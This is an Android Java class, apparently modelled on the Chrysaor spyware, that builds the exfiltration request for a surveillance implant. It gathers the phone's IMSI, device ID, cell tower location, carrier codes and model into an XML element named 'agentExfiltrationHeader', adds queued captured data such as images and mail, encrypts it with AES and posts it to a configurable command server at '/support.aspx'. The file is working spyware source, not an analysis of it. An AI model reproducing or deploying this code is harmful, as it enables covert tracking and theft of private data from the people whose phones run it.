package com.android.chrysaoralike;

import android.content.Context;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class HttpRequestBuilder {
    private static final String TAG = "HttpRequestBuilder";
    private static final String BOUNDARY = "__ANDROID_BOUNDARY__";
    private static final String CRLF = "\r\n";
    private static final String PATH = "/support.aspx";
    private Context context;
    private String token;
    private String serverHost;
    private int serverPort;
    private byte[] sessionKey;

    public HttpRequestBuilder(Context context) {
        this.context = context.getApplicationContext();
        SharedPreferences prefs = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE);
        this.token = prefs.getString("token", "myToken123");
        this.serverHost = prefs.getString("http_host", "10.0.2.2");
        this.serverPort = prefs.getInt("http_port", 8080);
        this.sessionKey = HttpCrypto.generateSessionKey();
    }

    public String getUrl() { return "http://" + serverHost + ":" + serverPort + PATH; }

    public byte[] buildRequestBody() {
        try {
            ByteArrayOutputStream body = new ByteArrayOutputStream();
            // Header part
            String headerXml = buildHeaderXml();
            byte[] headerEncrypted = HttpCrypto.aesEncryptOutbound(HttpCrypto.gzipCompress(headerXml.getBytes("UTF-8")), sessionKey);
            if (headerEncrypted == null) return null;
            writePart(body, "header", headerEncrypted);
            // Data part (empty)
            byte[] dataEncrypted = HttpCrypto.aesEncryptOutbound(HttpCrypto.gzipCompress(new byte[0]), sessionKey);
            if (dataEncrypted == null) return null;
            writePart(body, "data", dataEncrypted);
            // Log part
            byte[] logEncrypted = HttpCrypto.aesEncryptOutbound(HttpCrypto.gzipCompress("No error".getBytes("UTF-8")), sessionKey);
            if (logEncrypted == null) return null;
            writePart(body, "log", logEncrypted);
            // Dynamic parts from DataQueue
            DataQueue.DataPart dp;
            while ((dp = DataQueue.getInstance().poll()) != null) {
                byte[] content = dp.content;
                String name = dp.name;
                if (dp.isJpg) {
                    byte[] encrypted = HttpCrypto.aesEncryptOutbound(content, sessionKey);
                    if (encrypted != null) writePart(body, name, encrypted);
                } else if (name.endsWith(".jigglypuff_mail")) {
                    byte[] encrypted = HttpCrypto.aesEncryptOutbound(HttpCrypto.gzipCompress(content), sessionKey);
                    if (encrypted != null) writePart(body, name, encrypted);
                } else {
                    byte[] encrypted = HttpCrypto.aesEncryptOutbound(content, sessionKey);
                    if (encrypted != null) writePart(body, name, encrypted);
                }
                Log.i(TAG, "Added dynamic part: " + name + " (" + content.length + " bytes)");
            }
            // End boundary
            body.write(("--" + BOUNDARY + "--" + CRLF).getBytes("UTF-8"));
            return body.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Build request error", e);
            return null;
        }
    }

    private void writePart(ByteArrayOutputStream body, String name, byte[] data) throws IOException {
        body.write(("--" + BOUNDARY + CRLF).getBytes("UTF-8"));
        body.write(("Content-Disposition: form-data; name=\"" + name + "\"" + CRLF).getBytes("UTF-8"));
        body.write(CRLF.getBytes("UTF-8"));
        body.write(data);
        body.write(CRLF.getBytes("UTF-8"));
    }

    private String buildHeaderXml() {
        TelephonyManager tm = null;
        try { tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE); } catch (Exception ignored) {}
        String imsi = "000000000000000", deviceId = "unknown";
        String model = android.os.Build.MODEL, manufacturer = android.os.Build.MANUFACTURER;
        String osVersion = android.os.Build.VERSION.RELEASE, rom = android.os.Build.DISPLAY;
        int batteryLevel = 0;
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception ignored) {}
        long timestamp = System.currentTimeMillis() / 1000;
        String cellId = "0", lac = "0", mcc = "0", mnc = "0";
        if (tm != null) {
            try { String subId = tm.getSubscriberId(); if (subId != null) imsi = subId; } catch (SecurityException ignored) {}
            try { String devId = tm.getDeviceId(); if (devId != null) deviceId = devId; } catch (SecurityException ignored) {}
            try { String networkOperator = tm.getNetworkOperator(); if (networkOperator != null && networkOperator.length() >= 5) {
                mcc = networkOperator.substring(0, 3); mnc = networkOperator.substring(3); } } catch (Exception ignored) {}
            try { android.telephony.CellLocation cellLoc = tm.getCellLocation(); if (cellLoc != null) {
                String locStr = cellLoc.toString();
                java.util.regex.Pattern p = java.util.regex.Pattern.compile("cid=(\\d+).*lac=(\\d+)", java.util.regex.Pattern.CASE_INSENSITIVE);
                java.util.regex.Matcher m = p.matcher(locStr);
                if (m.find()) { cellId = m.group(1); lac = m.group(2); }
            } } catch (Exception ignored) {}
        }
        StringBuilder xml = new StringBuilder();
        xml.append("<?xml version=\"1.0\"?><agentExfiltrationHeader>");
        xml.append("<com comMethod=\"wifi\"/><protocol version=\"1\"/>");
        xml.append("<token id=\"").append(token).append("\"/>");
        xml.append("<platformInfo version=\"2.9.3\" batteryLevel=\"").append(batteryLevel)
                .append("\" less=\"00000000000000\" manufacturer=\"").append(manufacturer)
                .append("\" model=\"").append(model)
                .append("\" nativeId=\"").append(deviceId)
                .append("\" osVersion=\"").append(osVersion)
                .append("\" version=\"isRooted\" platform=\"android\" rom=\"").append(rom).append("\"/>");
        xml.append("<cellInfo cellId=\"").append(cellId)
                .append("\" LAC=\"").append(lac)
                .append("\" MCC=\"").append(mcc)
                .append("\" MNC=\"").append(mnc)
                .append("\" isRoaming=\"false\" timestamp=\"").append(timestamp).append("\"/>");
        xml.append("<telemetry/></agentExfiltrationHeader>");
        return xml.toString();
    }

    public byte[] getSessionKey() { return sessionKey; }
    public String getToken() { return token; }

    public void setServerHost(String host) { this.serverHost = host; context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).edit().putString("http_host", host).apply(); }
    public void setServerPort(int port) { this.serverPort = port; context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).edit().putInt("http_port", port).apply(); }
}